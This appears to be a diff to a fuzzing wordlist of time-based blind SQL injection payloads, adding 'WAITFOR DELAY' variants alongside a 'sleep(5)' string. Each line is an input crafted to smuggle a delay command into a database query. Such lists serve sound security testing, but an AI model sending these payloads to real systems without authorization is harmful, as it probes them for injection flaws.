@@ -1,4 +1,6 @@
- ')) or sleep(5)='
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'-- 
+')) or sleep(5)='
 ;waitfor delay '0:0:5'--
 );waitfor delay '0:0:5'--
 ';waitfor delay '0:0:5'--
